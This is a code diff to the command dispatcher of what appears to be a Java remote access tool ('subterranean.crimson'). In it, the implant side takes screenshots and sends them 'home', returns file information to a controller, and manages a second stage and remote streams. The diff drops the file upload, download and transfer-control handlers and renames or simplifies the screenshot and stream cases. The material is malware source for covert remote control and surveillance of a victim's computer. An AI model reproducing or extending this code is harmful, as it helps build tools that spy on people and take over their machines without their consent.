@@ -61,10 +61,10 @@ import subterranean.crimson.universal.containers.Message;
 import subterranean.crimson.universal.containers.TransferContainer;
 import subterranean.crimson.universal.objects.InvalidObjectException;
 import subterranean.crimson.universal.objects.ObjectTransfer;
-import subterranean.crimson.universal.streams.InfoStream;
 import subterranean.crimson.universal.streams.PreviewStream;
 import subterranean.crimson.universal.streams.RemoteStream;
 import subterranean.crimson.universal.streams.Stream;
+import subterranean.crimson.universal.streams.infostream.InfoStream;
 import subterranean.crimson.universal.transfer.DownloadTransfer;
 import subterranean.crimson.universal.transfer.Transfer;
 import subterranean.crimson.universal.transfer.UploadTransfer;
@@ -347,23 +347,7 @@ public enum Executor {
 
 			break;
 		}
-
-		case FILE_upload: {
-			DownloadTransfer trans = new DownloadTransfer((Integer) m.auxObject[0], (String) m.auxObject[1], (Integer) m.auxObject[2], (Integer) m.auxObject[3], (Long) m.auxObject[4]);
-			Logger.add("Adding transfer to list");
-			Stage2.transfers.add(trans);
-
-			break;
-		}
-		case FILE_download: {
-			UploadTransfer trans = new UploadTransfer((String) m.auxObject[0]);
-			trans.transferId = (Integer) m.auxObject[1];
-			trans.start();
-			Stage2.transfers.add(trans);
-
-			break;
-		}
-		case SCREENSHOT_quick: {
+		case BMN.SCREENMANAGER_screenshot: {
 
 			Message mres = new Message(m.getStreamID(), m.getName(), ScreenShot.run());
 			Communications.sendHome(mres);
@@ -409,109 +393,6 @@ public enum Executor {
 			HashMap<String, Object> info = GetFileInfo.run((String) m.auxObject[0]);
 			Message mres = new Message(m.getStreamID(), m.getName(), info);
 			Communications.sendHome(mres);
-
-			break;
-		}
-		case TRANSFER_pause: {
-			int transferID = (Integer) m.auxObject[0];
-
-			Logger.add("Pausing transfer: " + transferID);
-
-			// find transfer and pause it
-			for (Transfer t : Stage2.transfers) {
-				if (t.transferId == transferID) {
-					if (t instanceof UploadTransfer) {
-						UploadTransfer ut = (UploadTransfer) t;
-						ut.pause();
-
-					} else {
-						DownloadTransfer dt = (DownloadTransfer) t;
-						dt.pause();
-
-					}
-				}
-
-			}
-
-			break;
-		}
-		case TRANSFER_resume: {
-			int transferID = (Integer) m.auxObject[0];
-
-			Logger.add("Resuming transfer: " + transferID);
-
-			// find transfer and resume it
-			for (Transfer t : Stage2.transfers) {
-				if (t.transferId == transferID) {
-					if (t instanceof UploadTransfer) {
-						UploadTransfer ut = (UploadTransfer) t;
-						ut.unpause();
-
-					} else {
-						DownloadTransfer dt = (DownloadTransfer) t;
-						dt.unpause();
-
-					}
-				}
-
-			}
-			break;
-		}
-		case TRANSFER_terminate: {
-			int transferID = (Integer) m.auxObject[0];
-
-			Logger.add("Terminating transfer: " + transferID);
-
-			// find transfer and kill it
-			for (Transfer t : Stage2.transfers) {
-				if (t.transferId == transferID) {
-					if (t instanceof UploadTransfer) {
-						UploadTransfer ut = (UploadTransfer) t;
-						ut.terminate();
-
-					} else {
-						DownloadTransfer dt = (DownloadTransfer) t;
-						dt.terminate();
-
-					}
-				}
-
-			}
-			break;
-		}
-		case TRANSFER_data: {
-			for (Transfer t : Stage2.transfers) {
-				if (t instanceof DownloadTransfer) {
-					if (t.transferId == (int) m.auxObject[0]) {
-						((DownloadTransfer) t).add((TransferContainer) m.auxObject[1]);
-					}
-				}
-			}
-
-		}
-		case TRANSFER_getMD5: {
-			for (Transfer t : Stage2.transfers) {
-				if (t.transferId == (Integer) m.auxObject[0]) {
-					// send the md5 back
-					int slept = 0;
-					while (slept < 10) {
-						if (t.sha1 == null) {
-							try {
-								Thread.sleep(3000);
-							} catch (InterruptedException e) {
-								// TODO Auto-generated catch block
-								e.printStackTrace();
-							}
-
-						} else {
-							Message mres = new Message(m.getStreamID(), MN.TRANSFER_getMD5, t.sha1);
-							Communications.sendHome(mres);
-
-						}
-					}
-					break;
-				}
-			}
 
 			break;
 		}
@@ -579,19 +460,17 @@ public enum Executor {
 			StreamStore.streams.add(rs);
 			break;
 		}
+		case BMN.STREAMCONTROL_start: {
+
+			break;
+		}
 		case BMN.STREAMCONTROL_stop: {
 			StreamStore.removeStream((int) m.auxObject[0]);
 			break;
 		}
 		case BMN.STREAM_data: {
-			for (Stream s : StreamStore.streams) {
+			StreamStore.getStream((int) m.auxObject[0]).received(m);
 
-				if (s.getStreamID() == ((int) m.auxObject[0])) {
-					s.received(m);
-					return;
-				}
-			}
-			Logger.add("Dropped stream data packet");
 			break;
 		}
 		case BMN.CLIENT_stageQuery: {
